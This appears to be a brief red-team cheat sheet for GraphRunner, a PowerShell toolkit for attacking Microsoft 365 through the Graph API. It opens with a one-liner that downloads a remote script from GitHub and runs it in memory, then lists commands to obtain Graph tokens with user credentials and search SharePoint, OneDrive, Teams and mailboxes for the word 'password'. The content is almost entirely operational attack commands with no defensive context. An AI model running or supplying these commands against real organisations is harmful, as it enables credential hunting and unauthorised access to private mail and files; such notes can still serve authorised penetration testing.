# GraphRunner

## Command to execute: IEX (iwr 'https://raw.githubusercontent.com/dafthack/GraphRunner/main/GraphRunner.ps1') | iex

### Commands:

 - List-GraphRunnerModules (Lists all modules of graphrunner)

 - Get-GraphTokens -UserPasswordAuth (Authenticate with valid credentials to open a graph API session)

 - Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm 'password' (Search for files on OneDrive and Sharepoint containing the string "password" by using the tokens we dumped from the Graph API session)

 - Invoke-SearchTeams -Tokens $tokens -SearchTerm password (Search all Teams channels with the specific term that are readable by our user)

 - Invoke-SearchMailbox -Tokens $tokens -SearchTerm "password" -MessageCount 40 (Searches the mailbox of our current user)




